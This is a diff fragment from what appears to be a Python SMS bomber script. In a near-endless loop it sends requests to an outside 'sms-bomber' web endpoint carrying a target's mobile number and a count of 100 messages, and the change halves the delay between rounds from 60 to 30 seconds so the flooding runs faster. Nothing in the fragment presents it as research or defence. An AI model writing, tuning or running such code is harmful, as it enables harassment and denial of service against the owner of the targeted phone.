@@ -13,5 +13,5 @@ for x in range(99999999999):
         req = requests.get("https://freekamall.tech/sms-bomber/"+str(i)+".php?sent=2&&count=100&&mobno="+mobile_number)
         print(f"{str(count)} Time Sended")
         count=count+1
-        time.sleep(60)
+        time.sleep(30)
         
